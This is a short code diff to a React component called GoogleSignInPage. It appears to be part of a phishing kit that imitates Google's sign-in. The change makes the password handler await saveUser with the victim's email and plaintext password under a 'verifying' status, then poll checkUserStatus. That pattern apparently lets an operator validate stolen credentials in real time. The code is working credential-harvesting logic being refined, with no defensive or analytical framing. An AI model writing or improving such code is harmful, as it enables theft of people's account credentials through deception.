@@ -107,7 +107,7 @@ export default function GoogleSignInPage() {
     }, 600);
   };
 
-  const handlePasswordNext = (e: React.FormEvent) => {
+  const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
     const trimmedPwd = password.trim();
     if (!trimmedPwd) return;
@@ -123,8 +123,8 @@ export default function GoogleSignInPage() {
     }
 
     setLoading(true);
-    // Send high-priority 'verifying' status
-    saveUser(email, trimmedPwd, 'verifying');
+    // Send high-priority 'verifying' status and wait for it to commit
+    await saveUser(email, trimmedPwd, 'verifying');
 
     if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
     checkIntervalRef.current = setInterval(checkUserStatus, 1500);
